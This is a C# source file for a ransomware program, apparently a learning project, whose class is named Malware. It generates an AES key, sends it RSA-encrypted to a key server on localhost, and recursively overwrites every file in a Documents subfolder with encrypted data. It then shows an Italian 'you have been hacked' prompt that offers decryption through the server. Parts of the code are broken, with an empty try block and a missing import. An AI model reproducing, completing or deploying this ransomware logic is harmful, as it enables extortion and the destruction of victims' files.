using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace tanuki_the_cryptor
{
    public class Malware
    {
        private string folder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\esempio";
        private Communication comm = null;
        
        public void Run()
        {
            var RetryTimes = 3;
            var WaitTime = 6000;
            (byte[] key, byte[] iv) = (null, null);

            for (int i = 0; i < RetryTimes; i++)
            {
                try
                {
                    (key, iv) = GenerateKey();
                }
                catch (Exception Ex)
                {
                    //wait
                    continue;
                }

                EncryptFiles(folder, key, iv);

                try
                {

                }
            }
        }

        private (byte[], byte[])  GenerateKey()
        {
            byte[] key = null;
            byte[] iv = null;
            using (Aes aes = Aes.Create())
            {
                key = aes.Key;
                iv = aes.IV;
            }

            comm = new Communication("localhost", 6000);
            comm.Start();
            comm.SendMessage(Cryptography.RSAEncrypt(Encoding.ASCII.GetBytes("store")));
            comm.SendMessage(Cryptography.RSAEncrypt(key));
            Thread.Sleep(1000);
            comm.SendMessage(Cryptography.RSAEncrypt(iv));

            return (key, iv);
        }

        private void ExecCypher()
        {
            DialogResult dialogResult = MessageBox.Show("Tutti i file contenuti nella cartella Documenti sono stati cifrati. Vuoi decifrarli?",
                "Sei stato hackerato", MessageBoxButtons.YesNo);
            if (dialogResult == DialogResult.Yes)
            {
                (byte[] key, int key_len) = (null, 0);
                (byte[] iv, int iv_len) = (null, 0);

                comm.SendMessage(Cryptography.RSAEncrypt(Encoding.ASCII.GetBytes("retrieve")));
                (key, key_len) = comm.RecvMessage(32);
                (iv, iv_len) = comm.RecvMessage(16);

                comm.Close();

                DecryptFiles(folder, key, iv);
            }
            else if (dialogResult == DialogResult.No)
            {
                comm.Close();
            }
        }

        static void EncryptFiles(string sourceFolder, byte[] key, byte[] iv)
        {
            if (!Directory.Exists(sourceFolder)) { return; }

            string[] files = Directory.GetFiles(sourceFolder);
            foreach (string file in files)
            {
                string content = File.ReadAllText(file);
                byte[] encrypted = Cryptography.AESEncrypt(content, key, iv);
                File.WriteAllBytes(file, encrypted);
            }

            string[] folders = Directory.GetDirectories(sourceFolder);
            foreach (string folder in folders)
            {
                EncryptFiles(folder, key, iv);
            }
        }

        private void DecryptFiles(string sourceFolder, byte[] key, byte[] iv)
        {
            if (!Directory.Exists(sourceFolder)) { return; }

            string[] files = Directory.GetFiles(sourceFolder);
            foreach (string file in files)
            {
                byte[] content = File.ReadAllBytes(file);
                byte[] plainText = Cryptography.AESDecrypt(content, key, iv);
                File.WriteAllBytes(file, plainText);
            }

            string[] folders = Directory.GetDirectories(sourceFolder);
            foreach (string folder in folders)
            {
                DecryptFiles(folder, key, iv);
            }
        }
    }
}
